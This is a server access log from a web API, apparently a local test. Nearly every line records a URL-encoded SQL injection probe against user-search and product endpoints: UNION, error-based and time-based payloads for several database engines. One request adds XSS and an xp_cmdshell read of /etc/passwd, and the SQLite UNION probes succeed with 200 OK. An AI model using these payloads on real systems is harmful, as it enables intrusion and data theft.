api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:46854 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%280x716b627a71%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IFNULL%28QUARTER%28NULL%29%2CNULL%2F%2A%2A%2FXOR%2F%2A%2A%2FNULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2C0x716a627671%29%2CNULL--%2F%2A%2A%2F- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46858 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%280x716b627a71%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IFNULL%28QUARTER%28NULL%29%2CNULL%2F%2A%2A%2FXOR%2F%2A%2A%2FNULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2C0x716a627671%29%2CNULL--%2F%2A%2A%2F- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46864 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28LENGTH%28SYSDATE%29%3DLENGTH%28SYSDATE%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%2CNULL%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--%2F%2A%2A%2FKEXI HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46876 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28CONVERT_TO%28%27KfyA%27%2CQUOTE_IDENT%28NULL%29%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%28CHR%2849%29%29%2F%2A%2A%2FELSE%2F%2A%2A%2F%28CHR%2848%29%29%2F%2A%2A%2FEND%29%29%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%2CNULL--%2F%2A%2A%2FcuLz HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46890 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IS_SRVROLEMEMBER%28NULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28113%29%2CNULL--%2F%2A%2A%2FKIKm HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:46894 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCHAR%28113%2C107%2C98%2C122%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28LAST_INSERT_ROWID%28%29%3DLAST_INSERT_ROWID%28%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C106%2C98%2C118%2C113%29%2CNULL--%2F%2A%2A%2FeZnZ HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46908 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCHAR%28113%2C107%2C98%2C122%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28SQLITE_VERSION%28%29%3DSQLITE_VERSION%28%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C106%2C98%2C118%2C113%29%2CNULL--%2F%2A%2A%2FUytx HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46900 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCHAR%28113%2C107%2C98%2C122%2C113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28RANDOMBLOB%28-1%29%2F%2A%2A%2FIS%2F%2A%2A%2FNOT%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%7C%7CCHAR%28113%2C106%2C98%2C118%2C113%29%2CNULL--%2F%2A%2A%2Fdavo HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46948 - "GET /produtos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46958 - "GET /produtos?fGNv=3098%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46964 - "GET /produtos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:46970 - "GET /2174 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:46978 - "GET /produtos%27%28%28%29%29%29%22.%2C%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:46986 - "GET /produtos%27IQGLNm%3C%27%22%3EmhtCUC HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:46994 - "GET /produtos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:47010 - "GET /produtos%29/%2A%2A/AND/%2A%2A/3264%3D3152/%2A%2A/AND/%2A%2A/%287076%3D7076 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47012 - "GET /produtos%29/%2A%2A/AND/%2A%2A/8829%3D8829/%2A%2A/AND/%2A%2A/%285956%3D5956 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47024 - "GET /produtos/%2A%2A/AND/%2A%2A/4654%3D9722 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47032 - "GET /produtos/%2A%2A/AND/%2A%2A/8829%3D8829 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47046 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/3856%3D2152/%2A%2A/AND/%2A%2A/%28%27OuaI%27%3D%27OuaI HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47062 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/8829%3D8829/%2A%2A/AND/%2A%2A/%28%27tvyn%27%3D%27tvyn HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47068 - "GET /produtos%27/%2A%2A/AND/%2A%2A/4333%3D5946/%2A%2A/AND/%2A%2A/%27UVrX%27%3D%27UVrX HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47082 - "GET /produtos%27/%2A%2A/AND/%2A%2A/8829%3D8829/%2A%2A/AND/%2A%2A/%27eVgo%27%3D%27eVgo HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47092 - "GET /produtos/%2A%2A/AND/%2A%2A/8864%3D1277--/%2A%2A/gaYB HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47102 - "GET /produtos/%2A%2A/AND/%2A%2A/8829%3D8829--/%2A%2A/ARuN HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47104 - "GET /%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%283212%3D4695%29/%2A%2A/THEN/%2A%2A/%27produtos%27/%2A%2A/ELSE/%2A%2A/%28SELECT/%2A%2A/4695/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/9335%29/%2A%2A/END%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47106 - "GET /%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%283920%3D3920%29/%2A%2A/THEN/%2A%2A/%27produtos%27/%2A%2A/ELSE/%2A%2A/%28SELECT/%2A%2A/9790/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/7234%29/%2A%2A/END%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47114 - "GET /produtos%29/%2A%2A/AND/%2A%2A/EXTRACTVALUE%282740%2CCONCAT%280x5c%2C0x71706a7171%2C%28SELECT/%2A%2A/%28ELT%282740%3D2740%2C1%29%29%29%2C0x7176717171%29%29/%2A%2A/AND/%2A%2A/%286499%3D6499 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47118 - "GET /produtos/%2A%2A/AND/%2A%2A/EXTRACTVALUE%282740%2CCONCAT%280x5c%2C0x71706a7171%2C%28SELECT/%2A%2A/%28ELT%282740%3D2740%2C1%29%29%29%2C0x7176717171%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47132 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/EXTRACTVALUE%282740%2CCONCAT%280x5c%2C0x71706a7171%2C%28SELECT/%2A%2A/%28ELT%282740%3D2740%2C1%29%29%29%2C0x7176717171%29%29/%2A%2A/AND/%2A%2A/%28%27rKmv%27%3D%27rKmv HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47134 - "GET /produtos%27/%2A%2A/AND/%2A%2A/EXTRACTVALUE%282740%2CCONCAT%280x5c%2C0x71706a7171%2C%28SELECT/%2A%2A/%28ELT%282740%3D2740%2C1%29%29%29%2C0x7176717171%29%29/%2A%2A/AND/%2A%2A/%27HACK%27%3D%27HACK HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47148 - "GET /produtos/%2A%2A/AND/%2A%2A/EXTRACTVALUE%282740%2CCONCAT%280x5c%2C0x71706a7171%2C%28SELECT/%2A%2A/%28ELT%282740%3D2740%2C1%29%29%29%2C0x7176717171%29%29--/%2A%2A/zXmt HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47164 - "GET /produtos%29/%2A%2A/AND/%2A%2A/9055%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289055%3D9055%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%288550%3D8550 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47180 - "GET /produtos/%2A%2A/AND/%2A%2A/9055%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289055%3D9055%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47190 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/9055%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289055%3D9055%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%28%27akxV%27%3D%27akxV HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47192 - "GET /produtos%27/%2A%2A/AND/%2A%2A/9055%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289055%3D9055%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%27JMZg%27%3D%27JMZg HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47208 - "GET /produtos/%2A%2A/AND/%2A%2A/9055%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289055%3D9055%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29--/%2A%2A/edVj HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47220 - "GET /produtos%29/%2A%2A/AND/%2A%2A/9782/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289782%3D9782%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%285138%3D5138 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47218 - "GET /produtos/%2A%2A/AND/%2A%2A/9782/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289782%3D9782%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47232 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/9782/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289782%3D9782%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%28%27hNzD%27%3D%27hNzD HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47244 - "GET /produtos%27/%2A%2A/AND/%2A%2A/9782/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289782%3D9782%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%27NQkQ%27%3D%27NQkQ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47248 - "GET /produtos/%2A%2A/AND/%2A%2A/9782/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289782%3D9782%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--/%2A%2A/lCrP HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47236 - "GET /produtos%29/%2A%2A/AND/%2A%2A/7609%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287609%3D7609%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%282039%3D2039 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47250 - "GET /produtos/%2A%2A/AND/%2A%2A/7609%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287609%3D7609%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47258 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/7609%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287609%3D7609%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%28%27IODX%27%3D%27IODX HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47264 - "GET /produtos%27/%2A%2A/AND/%2A%2A/7609%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287609%3D7609%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%27yasu%27%3D%27yasu HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47266 - "GET /produtos/%2A%2A/AND/%2A%2A/7609%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287609%3D7609%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29--/%2A%2A/GMNl HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47280 - "GET /%28SELECT/%2A%2A/CONCAT%28CONCAT%28%27qpjqq%27%2C%28CASE/%2A%2A/WHEN/%2A%2A/%289997%3D9997%29/%2A%2A/THEN/%2A%2A/%271%27/%2A%2A/ELSE/%2A%2A/%270%27/%2A%2A/END%29%29%2C%27qvqqq%27%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47286 - "GET /produtos%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47290 - "GET /produtos%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47296 - "GET /produtos%27%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47310 - "GET /produtos%27%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47322 - "GET /produtos%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47330 - "GET /produtos%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47342 - "GET /produtos%27%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47346 - "GET /produtos%27%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47354 - "GET /produtos%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2879%29%7C%7CCHR%28116%29%7C%7CCHR%2873%29%7C%7CCHR%28103%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47370 - "GET /produtos%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2879%29%7C%7CCHR%28116%29%7C%7CCHR%2873%29%7C%7CCHR%28103%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47376 - "GET /produtos%27%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2879%29%7C%7CCHR%28116%29%7C%7CCHR%2873%29%7C%7CCHR%28103%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47380 - "GET /produtos%27%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2879%29%7C%7CCHR%28116%29%7C%7CCHR%2873%29%7C%7CCHR%28103%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47394 - "GET /produtos%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/2842/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29gGKK%29/%2A%2A/AND/%2A%2A/%286351%3D6351 HTTP/1.1" 404 Not Found
